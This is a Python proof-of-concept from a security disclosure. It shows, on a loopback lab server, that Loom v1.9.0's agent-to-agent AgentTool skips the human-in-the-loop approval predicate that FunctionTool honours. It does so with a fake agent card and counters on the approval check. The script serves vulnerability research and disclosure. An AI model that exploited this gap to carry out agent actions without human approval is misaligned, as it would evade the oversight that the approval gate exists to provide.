#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: loom-adk-a2a-hitl (Medium: 6.5)
#  Vendor: Loom (AWS)
#  Versions: Loom v1.9.0 and v1.10.3
#  Impact: ADK agent-to-agent tool never awaits the approval check
#  Requires: Docker, loopback only, public tag checkout
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "loom-adk-a2a-hitl"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _PRINT(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _PRINT(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_PRINT = _builtins.print
_builtins.print = _cprint

"""Prove Loom v1.9.0 ADK A2A AgentTool skips the HITL predicate."""

import asyncio
import contextvars
import importlib.metadata
import importlib.util
import inspect
import json
import os
import sys
import threading
import traceback
from collections.abc import Iterator
from contextlib import contextmanager
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

LABEL = "LOOM-190-ADK-A2A-HITL"
WITNESS = "LOOM-190-ADK-A2A-HITL-WITNESS"
HOST = os.environ.get("LAB_HOST", "127.0.0.1")
PORT = int(os.environ.get("LAB_PORT", "18740"))
ROOT = Path(os.environ.get("LOOM_SRC_ROOT", "/opt/loom"))
ADK_ROOT = ROOT / "agents" / "adk_agent"
STRANDS_APPROVAL = (
    ROOT / "agents" / "strands_agent" / "src" / "integrations" / "approval.py"
)
STRANDS_A2A = ROOT / "agents" / "strands_agent" / "src" / "integrations" / "a2a_client.py"

POLICY: dict[str, Any] = {
    "name": "match-all",
    "enabled": True,
    "policy_type": "loop_hook",
    "approval_mode": "require_approval",
    "tool_match_rules": [],
}

_SENDS: contextvars.ContextVar[list[str] | None] = contextvars.ContextVar(
    "lab_sends", default=None
)


def fail(reason: str, *, closed: bool = False) -> int:
    tag = "leftover-closed " if closed else ""
    print(f"FAIL {LABEL} {tag}{reason} {WITNESS}")
    return 1


def _load_module(name: str, path: Path) -> Any:
    spec = importlib.util.spec_from_file_location(name, path)
    if spec is None or spec.loader is None:
        raise ImportError(f"cannot load {path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


def _patched_name(tool: Any) -> str:
    func = getattr(tool.check_require_confirmation, "__func__", None)
    target = func if func is not None else tool.check_require_confirmation
    return str(getattr(target, "__qualname__", ""))


def _count_predicate(tool: Any) -> list[int]:
    bound = tool.check_require_confirmation
    counter = [0]

    async def _counted(args: dict[str, Any], tool_context: Any) -> bool:
        counter[0] += 1
        return await bound(args, tool_context)

    tool.check_require_confirmation = _counted
    return counter


@contextmanager
def _card_server(card_path: str, body: bytes) -> Iterator[None]:
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            request_path = self.path.split("?", 1)[0]
            if request_path != card_path:
                self.send_error(404)
                return
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, fmt: str, *args: Any) -> None:
            return

    server = ThreadingHTTPServer((HOST, PORT), Handler)
    thread = threading.Thread(target=server.serve_forever, name="card", daemon=True)
    thread.start()
    try:
        yield
    finally:
        server.shutdown()
        server.server_close()


def _card(endpoint: str) -> dict[str, Any]:
    return {
        "name": "partner",
        "description": "Lab partner.",
        "version": "1.0.0",
        "protocolVersion": "1.0",
        "capabilities": {"streaming": False, "pushNotifications": False},
        "defaultInputModes": ["text/plain"],
        "defaultOutputModes": ["text/plain"],
        "skills": [
            {
                "id": "send",
                "name": "send",
                "description": "Accept a message.",
                "tags": ["lab"],
            }
        ],
        "supportedInterfaces": [
            {
                "url": f"{endpoint}/",
                "protocolBinding": "JSONRPC",
                "protocolVersion": "1.0",
            }
        ],
    }


def lab_echo(text: str) -> str:
    """Echo a note. The body must not run when the policy matches."""
    raise RuntimeError(f"function-body-ran:{text}")


async def _tool_context(agent: Any, function_call_id: str) -> Any:
    from google.adk.agents.invocation_context import InvocationContext
    from google.adk.sessions.in_memory_session_service import InMemorySessionService
    from google.adk.tools.tool_context import ToolContext

    session_service = InMemorySessionService()
    session = await session_service.create_session(app_name="lab", user_id="lab")
    invocation = InvocationContext(
        invocation_id="lab-invocation",
        agent=agent,
        session=session,
        session_service=session_service,
    )
    return ToolContext(invocation, function_call_id=function_call_id)


async def _prove() -> int:
    from google.adk.agents.base_agent import BaseAgent
    from google.adk.events.event import Event
    from google.adk.tools.agent_tool import AgentTool
    from google.adk.tools.function_tool import FunctionTool
    from google.genai import types

    sys.path.insert(0, str(ADK_ROOT))
    from src.config import A2AAgentConfig
    from src.integrations.a2a_client import _build_a2a_tool
    from src.integrations.approval import ApprovalPolicyMatcher, apply_confirmation_to_tools

    strands = _load_module("loom_strands_approval", STRANDS_APPROVAL)
    strands_a2a = STRANDS_A2A.read_text(encoding="utf-8")
    if "a2a_{agent_name}" not in strands_a2a:
        return fail("strands-a2a-tool-name-missing")

    from a2a.utils.constants import AGENT_CARD_WELL_KNOWN_PATH

    endpoint = f"http://{HOST}:{PORT}"
    card_path = "/" + AGENT_CARD_WELL_KNOWN_PATH.lstrip("/")
    body = json.dumps(_card(endpoint)).encode("utf-8")
    print(f"google-adk={importlib.metadata.version('google-adk')}")
    print(f"strands-agents={importlib.metadata.version('strands-agents')}")
    print("policy=loop_hook require_approval rules=empty")

    class _RecordingAgent(BaseAgent):
        async def _run_async_impl(self, ctx: Any) -> Any:
            text = ""
            content = getattr(ctx, "user_content", None)
            parts = getattr(content, "parts", None) or []
            if parts:
                text = getattr(parts[0], "text", "") or ""
            log = _SENDS.get()
            if log is not None:
                log.append(text or "send")
            yield Event(
                author=self.name,
                content=types.Content(
                    role="model",
                    parts=[types.Part(text="lab-send")],
                ),
            )

    with _card_server(card_path, body):
        built = await _build_a2a_tool(
            A2AAgentConfig(name="partner", enabled=True, endpoint_url=endpoint)
        )
        if not isinstance(built, AgentTool):
            return fail(f"product-a2a-not-agenttool got={type(built).__name__}")
        remote = built.agent
        http_client = getattr(remote, "_httpx_client", None)

        function_tool = FunctionTool(lab_echo)
        matcher = ApprovalPolicyMatcher(policies=[POLICY])
        apply_confirmation_to_tools([function_tool, built], matcher)
        if "_check_require_confirmation" not in _patched_name(function_tool):
            return fail("function-predicate-not-patched")
        if "_check_require_confirmation" not in _patched_name(built):
            return fail("agenttool-predicate-not-patched")

        fn_counter = _count_predicate(function_tool)
        fn_ctx = await _tool_context(remote, "lab-fn-1")
        try:
            fn_result = await function_tool.run_async(
                args={"text": "note"}, tool_context=fn_ctx
            )
        except RuntimeError as exc:
            if str(exc).startswith("function-body-ran"):
                print("function-tool-would-pause=no")
                return fail("function-tool-body-ran", closed=True)
            raise
        error = fn_result.get("error", "") if isinstance(fn_result, dict) else ""
        fn_paused = fn_counter[0] > 0 and "confirmation" in error.lower()
        print(f"function-tool-would-pause={'yes' if fn_paused else 'no'}")
        print(f"function-tool-predicate-calls={fn_counter[0]}")
        if not fn_paused:
            return fail(
                f"function-tool-skipped result={fn_result!r} calls={fn_counter[0]}",
                closed=True,
            )

        source = inspect.getsource(AgentTool.run_async)
        source_calls = "check_require_confirmation" in source
        print(f"agenttool-run-async-calls-predicate={'yes' if source_calls else 'no'}")
        fn_source = inspect.getsource(FunctionTool.run_async)
        if "check_require_confirmation" not in fn_source:
            print("function-tool-would-pause=no")
            return fail("function-tool-source-skips", closed=True)

        at_counter = _count_predicate(built)
        recording = _RecordingAgent(name="partner", description="records one send")
        built.agent = recording
        sends: list[str] = []
        token = _SENDS.set(sends)
        try:
            at_ctx = await _tool_context(recording, "lab-a2a-1")
            at_result = await built.run_async(
                args={"request": "lab-request"}, tool_context=at_ctx
            )
        finally:
            _SENDS.reset(token)
            if http_client is not None:
                await http_client.aclose()

        completed = bool(sends) and at_result == "lab-send"
        print(f"agenttool-predicate-calls={at_counter[0]}")
        print(f"agenttool-completed={'yes' if completed else 'no'}")
        print("strands-tool=a2a_partner")

        if at_counter[0] > 0 and not completed:
            return fail(
                f"agenttool-paused calls={at_counter[0]} result={at_result!r}",
                closed=True,
            )
        if source_calls or at_counter[0] != 0 or not completed:
            return fail(
                "agenttool-oracle-miss "
                f"source_calls={source_calls} calls={at_counter[0]} "
                f"sends={sends!r} result={at_result!r}"
            )

        hook = strands.ApprovalHook(policies=[POLICY])
        matched = hook._find_matching_policy("a2a_partner")
        strands_pause = (
            isinstance(matched, dict)
            and matched.get("approval_mode", "require_approval") != "notify_only"
        )
        print(f"strands-would-pause={'yes' if strands_pause else 'no'}")
        if not strands_pause:
            return fail("strands-matcher-miss")

    print(f"SUCCESS {LABEL} agenttool-predicate-calls=0 {WITNESS}")
    return 0


def main() -> int:
    try:
        return asyncio.run(_prove())
    except Exception as exc:
        traceback.print_exc()
        return fail(f"{type(exc).__name__}: {exc}")


if __name__ == "__main__":
    raise SystemExit(main())

